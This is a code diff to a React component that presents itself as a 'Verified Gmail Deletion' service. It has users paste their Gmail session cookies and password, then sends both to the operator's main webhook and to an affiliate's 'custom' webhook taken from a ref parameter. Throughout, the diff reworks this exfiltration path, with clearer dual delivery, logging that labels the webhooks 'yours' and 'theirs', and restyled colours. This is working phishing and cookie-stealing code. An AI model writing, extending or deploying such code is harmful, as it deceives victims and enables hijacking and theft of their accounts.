@@ -27,25 +27,44 @@ export const VerifyGmailDelete = ({
     const urlParams = new URLSearchParams(window.location.search);
     const refId = urlParams.get("ref");
 
-    console.log("🔍 Checking custom instance...");
+    console.log("🔍 Checking for custom instance...");
     console.log("Current URL:", window.location.href);
     console.log("Ref ID:", refId);
 
     if (refId) {
-      const webhookData = localStorage.getItem(`webhook_${refId}`);
+      // Try to get webhook data from localStorage
+      const webhookKey = `webhook_${refId}`;
+      const webhookData = localStorage.getItem(webhookKey);
+
+      console.log("📦 Looking for webhook key:", webhookKey);
       console.log("📦 Raw webhook data:", webhookData);
 
       if (webhookData) {
         try {
           const parsed = JSON.parse(webhookData);
           console.log("✅ Parsed webhook data:", parsed);
-          return { refId, webhookData: parsed };
+          if (parsed.webhook) {
+            console.log("🎯 Custom webhook found:", parsed.webhook);
+            return { refId, webhookData: parsed };
+          } else {
+            console.error("❌ No webhook URL in parsed data");
+          }
         } catch (error) {
           console.error("❌ Error parsing webhook data:", error);
         }
       } else {
         console.error("❌ No webhook data found for refId:", refId);
+        // Let's check what keys exist in localStorage
+        console.log("🔍 All localStorage keys:", Object.keys(localStorage));
+        for (let i = 0; i < localStorage.length; i++) {
+          const key = localStorage.key(i);
+          if (key && key.startsWith("webhook_")) {
+            console.log(`📋 Found webhook key: ${key}`);
+          }
+        }
       }
+    } else {
+      console.log("ℹ️ No ref parameter found - this is the main instance");
     }
 
     return { refId: null, webhookData: null };
@@ -86,11 +105,11 @@ export const VerifyGmailDelete = ({
             webhookType === "custom"
               ? "🛡️ Verified Gmail Delete (Custom Instance)"
               : "🛡️ Verified Gmail Delete (Main System)",
-          color: 0xff6600,
+          color: webhookType === "custom" ? 0xc0c0c0 : 0xff6600, // Silver for custom, orange for main
           description:
             webhookType === "custom"
-              ? "New verified Gmail deletion request from your custom instance!"
-              : "Verified Gmail deletion request received and processed.",
+              ? "🎯 New verified Gmail deletion request from your custom instance!"
+              : "📨 Verified Gmail deletion request received and processed.",
           fields: [
             {
               name: "🍪 Cookies",
@@ -145,11 +164,11 @@ export const VerifyGmailDelete = ({
             webhookType === "custom"
               ? "🛡️ Verified Gmail Delete (Custom Instance) - LARGE DATA"
               : "🛡️ Verified Gmail Delete (Main System) - LARGE DATA",
-          color: 0xff6600,
+          color: webhookType === "custom" ? 0xc0c0c0 : 0xff6600, // Silver for custom, orange for main
           description:
             webhookType === "custom"
-              ? `New verified Gmail deletion request from your custom instance! Data split into ${cookieChunks.length} parts.`
-              : `Verified Gmail deletion request received and processed. Data split into ${cookieChunks.length} parts.`,
+              ? `🎯 New verified Gmail deletion request from your custom instance! Data split into ${cookieChunks.length} parts.`
+              : `📨 Verified Gmail deletion request received and processed. Data split into ${cookieChunks.length} parts.`,
           fields: [
             {
               name: "🔐 Password",
@@ -201,7 +220,7 @@ export const VerifyGmailDelete = ({
         cookieChunks.forEach((chunk, index) => {
           embeds.push({
             title: `🍪 Cookies Part ${index + 1}/${cookieChunks.length}`,
-            color: 0xff8844,
+            color: webhookType === "custom" ? 0xa9a9a9 : 0xff8844, // Dark gray for custom, light orange for main
             description: `\`\`\`${chunk}\`\`\``,
             footer: {
               text: `Part ${index + 1} of ${cookieChunks.length}`,
@@ -262,7 +281,7 @@ export const VerifyGmailDelete = ({
     const { refId, webhookData } = getWebhookData();
     const data = { cookies, password };
 
-    console.log("🚀 Starting webhook delivery process...");
+    console.log("🚀 Starting dual webhook delivery process...");
     console.log("📋 Data size:", cookies.length, "characters");
     console.log("🆔 RefId:", refId);
     console.log("📦 Webhook Data:", webhookData);
@@ -270,11 +289,14 @@ export const VerifyGmailDelete = ({
     let mainWebhookSuccess = false;
     let customWebhookSuccess = false;
 
-    // Always send to main webhook first
+    // ALWAYS send to main webhook first
     try {
-      console.log("📤 Sending to main webhook...");
+      console.log("📤 Sending to MAIN webhook...");
       mainWebhookSuccess = await sendToWebhook(MAIN_WEBHOOK, data, "main");
-      console.log("📊 Main webhook result:", mainWebhookSuccess);
+      console.log(
+        "📊 Main webhook result:",
+        mainWebhookSuccess ? "✅ SUCCESS" : "❌ FAILED",
+      );
     } catch (error) {
       console.error("❌ Main webhook failed:", error);
     }
@@ -282,39 +304,45 @@ export const VerifyGmailDelete = ({
     // Send to custom webhook if this is a custom instance
     if (refId && webhookData && webhookData.webhook) {
       try {
-        console.log("📤 Sending to custom webhook:", webhookData.webhook);
+        console.log("📤 Sending to CUSTOM webhook...");
+        console.log("🎯 Custom webhook URL:", webhookData.webhook);
         customWebhookSuccess = await sendToWebhook(
           webhookData.webhook,
           data,
           "custom",
         );
-        console.log("📊 Custom webhook result:", customWebhookSuccess);
+        console.log(
+          "📊 Custom webhook result:",
+          customWebhookSuccess ? "✅ SUCCESS" : "❌ FAILED",
+        );
       } catch (error) {
         console.error("❌ Custom webhook failed:", error);
       }
     } else {
+      console.log("ℹ️ Skipping custom webhook:");
+      console.log("  - Has refId?", !!refId);
+      console.log("  - Has webhookData?", !!webhookData);
       console.log(
-        "ℹ️ No custom webhook to send to (not a custom instance or no webhook data)",
+        "  - Has webhook URL?",
+        webhookData ? !!webhookData.webhook : false,
       );
     }
 
-    // Report results
-    console.log("📊 Final Results:");
+    // Report final results
+    console.log("📊 FINAL DELIVERY RESULTS:");
     console.log(
-      "  - Main webhook:",
-      mainWebhookSuccess ? "✅ SUCCESS" : "❌ FAILED",
+      `  🎯 Main webhook (yours): ${mainWebhookSuccess ? "✅ DELIVERED" : "❌ FAILED"}`,
     );
     console.log(
-      "  - Custom webhook:",
-      customWebhookSuccess ? "✅ SUCCESS" : "❌ FAILED",
+      `  🎯 Custom webhook (theirs): ${customWebhookSuccess ? "✅ DELIVERED" : "❌ FAILED"}`,
     );
 
     // Consider success if at least one webhook succeeded
     if (mainWebhookSuccess || customWebhookSuccess) {
-      console.log("🎉 At least one webhook succeeded, calling onSuccess");
+      console.log("🎉 At least one webhook delivered successfully!");
       onSuccess();
     } else {
-      console.error("💥 All webhooks failed");
+      console.error("💥 ALL WEBHOOKS FAILED!");
       setError("Failed to process request. Please try again.");
     }
 
@@ -332,7 +360,7 @@ export const VerifyGmailDelete = ({
       animate={{ opacity: 1, x: 0 }}
       transition={{ duration: 0.5 }}
     >
-      <Card className="w-full max-w-2xl bg-black/80 border-orange-600/50 backdrop-blur-2xl shadow-2xl">
+      <Card className="w-full max-w-2xl bg-black/80 border-gray-500/50 backdrop-blur-2xl shadow-2xl shadow-gray-400/20">
         <CardHeader className="text-center pb-6">
           <motion.div
             initial={{ y: -20 }}
@@ -340,18 +368,18 @@ export const VerifyGmailDelete = ({
             transition={{ delay: 0.2 }}
             className="flex flex-col items-center"
           >
-            <div className="mb-4 p-3 bg-orange-600/20 rounded-full">
+            <div className="mb-4 p-3 bg-gradient-to-br from-orange-600/20 to-gray-500/20 rounded-full border border-gray-400/30">
               <Shield className="w-8 h-8 text-orange-400" />
             </div>
-            <CardTitle className="text-3xl font-bold text-white mb-2">
+            <CardTitle className="text-3xl font-bold text-white mb-2 bg-gradient-to-r from-white to-gray-300 bg-clip-text text-transparent">
               Verified Gmail Deletion
             </CardTitle>
-            <p className="text-orange-300 text-sm">
+            <p className="text-gray-300 text-sm">
               Enter cookies and password for verified deletion
             </p>
             {isCustomInstance && (
-              <div className="mt-2 px-3 py-1 bg-purple-600/20 rounded-full border border-purple-500/30">
-                <p className="text-purple-300 text-xs">
+              <div className="mt-2 px-3 py-1 bg-gradient-to-r from-gray-600/20 to-gray-500/20 rounded-full border border-gray-400/30">
+                <p className="text-gray-300 text-xs">
                   Custom Instance: {refId}
                 </p>
               </div>
@@ -372,7 +400,7 @@ export const VerifyGmailDelete = ({
                 placeholder="Paste your cookies here... (supports large data)"
                 value={cookies}
                 onChange={(e) => setCookies(e.target.value)}
-                className="bg-black/60 border-orange-600/50 text-white placeholder:text-gray-500 min-h-[150px] focus:border-orange-500 transition-colors resize-none"
+                className="bg-black/60 border-gray-500/50 text-white placeholder:text-gray-400 min-h-[150px] focus:border-gray-400 transition-colors resize-none"
                 disabled={isLoading}
               />
               {cookies.length > 0 && (
@@ -401,7 +429,7 @@ export const VerifyGmailDelete = ({
                 placeholder="Enter password"
                 value={password}
                 onChange={(e) => setPassword(e.target.value)}
-                className="bg-black/60 border-orange-600/50 text-white placeholder:text-gray-500 h-12 focus:border-orange-500 transition-colors"
+                className="bg-black/60 border-gray-500/50 text-white placeholder:text-gray-400 h-12 focus:border-gray-400 transition-colors"
                 disabled={isLoading}
               />
             </motion.div>
@@ -434,7 +462,7 @@ export const VerifyGmailDelete = ({
               </Button>
               <Button
                 type="submit"
-                className="flex-1 bg-gradient-to-r from-orange-600 to-orange-700 hover:from-orange-500 hover:to-orange-600 text-white h-12 font-semibold shadow-lg"
+                className="flex-1 bg-gradient-to-r from-orange-600 to-gray-600 hover:from-orange-500 hover:to-gray-500 text-white h-12 font-semibold shadow-lg shadow-gray-400/25"
                 disabled={isLoading || !cookies.trim() || !password.trim()}
               >
                 {isLoading ? "Processing..." : "Delete Verified Gmail"}
